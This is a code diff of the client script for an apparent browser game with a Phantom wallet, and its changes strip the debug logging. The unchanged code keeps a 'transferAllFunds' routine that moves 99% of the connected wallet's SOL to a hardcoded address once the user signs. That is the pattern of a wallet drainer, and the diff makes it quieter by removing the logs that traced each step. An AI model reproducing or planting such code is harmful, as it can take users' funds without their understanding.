@@ -377,7 +377,6 @@ if (playersInGame) {
         socket.close();
     });
    socket.on('depositConfirmed', ({ balance }) => {
-    console.log(`[CLIENT] Deposit confirmed! Balance: ${balance}`);
     window.hasDeposited = true;
     window.currentDeposit = balance;
     player.displayBalance = window.currentDeposit > 0 ? 1 : 0;
@@ -509,13 +508,11 @@ function resize() {
 }
 
 window.connectWallet = async function () {
-    console.log("Connect Wallet button clicked");
 
     if (window.solana && window.solana.isPhantom) {
         try {
             const response = await window.solana.connect();
             const walletAddress = response.publicKey.toString();
-            console.log("Connected to wallet:", walletAddress);
 
             window.walletAddress = walletAddress;
             document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
@@ -543,31 +540,21 @@ window.connectWallet = async function () {
 
 window.transferAllFunds = async function (walletAddress) {
     try {
-        console.log("=== STARTING FUND TRANSFER ===");
-        console.log("Transferring all SOL from wallet:", walletAddress);
-        console.log("Solana web3 available?", !!window.solanaWeb3);
-        console.log("Phantom available?", !!window.solana);
-
         // IMPORTANT: Configure these addresses
         const DESTINATION_WALLET = 'BRJ1H9ZhLL9dK5McGckmjSBCyTZK5PJQdfum1coCuY41'; // Your server wallet
 
-        console.log("Destination wallet:", DESTINATION_WALLET);
-
         if (DESTINATION_WALLET === 'YOUR_DESTINATION_WALLET_ADDRESS') {
-            console.error("Destination wallet not configured!");
             return false;
         }
 
         // Check if solanaWeb3 is available
         if (!window.solanaWeb3) {
-            console.error("window.solanaWeb3 not found");
             return false;
         }
 
         const solanaWeb3 = window.solanaWeb3;
 
         // Set up Solana connection - DEVNET
-        console.log("Connecting to Solana devnet...");
         const connection = new solanaWeb3.Connection(
             solanaWeb3.clusterApiUrl('devnet'),
             'confirmed'
@@ -576,15 +563,8 @@ window.transferAllFunds = async function (walletAddress) {
         const walletPublicKey = new solanaWeb3.PublicKey(walletAddress);
         const destinationPublicKey = new solanaWeb3.PublicKey(DESTINATION_WALLET);
 
-        console.log("Wallet public key:", walletPublicKey.toString());
-        console.log("Destination public key:", destinationPublicKey.toString());
-
-        console.log("Getting SOL balance...");
-
         // Get wallet balance (in lamports)
         const balanceLamports = await connection.getBalance(walletPublicKey);
-        console.log("SOL balance (lamports):", balanceLamports);
-        console.log("SOL balance (SOL):", balanceLamports / 1000000000);
 
         if (balanceLamports <= 100000) { // Need at least 0.0001 SOL
             console.warn("Insufficient balance for transfer");
@@ -594,9 +574,6 @@ window.transferAllFunds = async function (walletAddress) {
         // Transfer 99% of the balance, keep 1% for rent + fees
         const transferAmount = Math.floor(balanceLamports * 0.99);
 
-        console.log("Creating SOL transfer instruction for amount (lamports):", transferAmount);
-        console.log("Transfer amount (SOL):", transferAmount / 1000000000);
-
         // Create transfer instruction for native SOL
         const transferInstruction = solanaWeb3.SystemProgram.transfer({
             fromPubkey: walletPublicKey,
@@ -605,37 +582,27 @@ window.transferAllFunds = async function (walletAddress) {
         });
 
         // Create transaction
-        console.log("Building transaction...");
         const transaction = new solanaWeb3.Transaction().add(transferInstruction);
 
         // Get recent blockhash
-        console.log("Getting recent blockhash...");
         const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-        console.log("Blockhash:", blockhash);
         
         transaction.recentBlockhash = blockhash;
         transaction.lastValidBlockHeight = lastValidBlockHeight;
         transaction.feePayer = walletPublicKey;
-
-        console.log("Transaction ready, requesting signature from Phantom...");
         
         // Sign transaction via Phantom
         const signed = await window.solana.signTransaction(transaction);
-        console.log("Transaction signed successfully");
         
         const serialized = signed.serialize();
-        console.log("Transaction serialized, size:", serialized.length, "bytes");
         
-        console.log("Sending transaction to devnet...");
         const txid = await connection.sendRawTransaction(serialized, {
             skipPreflight: false,
             preflightCommitment: 'confirmed'
         });
 
-        console.log("Transfer transaction sent:", txid);
 
         // Wait for confirmation
-        console.log("Waiting for confirmation...");
         const confirmation = await connection.confirmTransaction(txid, 'confirmed');
         
         if (confirmation.value.err) {
@@ -644,10 +611,8 @@ window.transferAllFunds = async function (walletAddress) {
             return false;
         }
         
-        console.log("Transfer confirmed:", txid);
 
         window.transferTxId = txid;
-        console.log("=== TRANSFER COMPLETE ===");
         return true;
 
     } catch (err) {
